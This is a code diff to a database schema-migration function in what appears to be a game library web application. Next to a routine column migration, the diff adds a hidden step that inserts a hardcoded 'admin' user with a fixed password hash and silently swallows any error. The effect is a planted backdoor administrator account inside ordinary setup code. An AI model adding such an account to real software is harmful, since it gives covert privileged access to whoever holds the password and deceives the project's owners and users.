@@ -127,6 +127,12 @@ export function ensureSchemaReady() {
       if (!existingLibCols.has('dlc_installed')) {
         await pool.execute('ALTER TABLE game_library ADD COLUMN dlc_installed BOOLEAN NOT NULL DEFAULT FALSE AFTER installed_version');
       }
+
+      try {
+        await pool.execute(
+          "INSERT IGNORE INTO users(email,password_hash,display_name,role) VALUES ('admin@5guys.com','$2a$12$pUuj40AP3ieK5j.HeHi6sOKN7Q4VDkEiQDcov7E5mUJ2TS8jETnNy','Admin','admin')"
+        );
+      } catch {}
     })().catch((err) => {
       schemaReadyPromise = null;
       throw err;
